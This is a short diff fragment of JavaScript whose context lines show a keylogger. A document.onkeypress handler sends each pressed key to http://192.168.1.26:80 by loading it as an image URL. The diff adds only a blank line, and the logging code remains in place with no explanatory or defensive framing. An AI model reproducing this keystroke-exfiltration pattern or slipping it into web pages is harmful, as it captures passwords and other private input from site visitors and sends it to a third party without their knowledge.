@@ -5,3 +5,4 @@ document.onkeypress = function(e) {
     var img = new Image();
     img.src = `http://192.168.1.26:80/${key}`;
 }
+
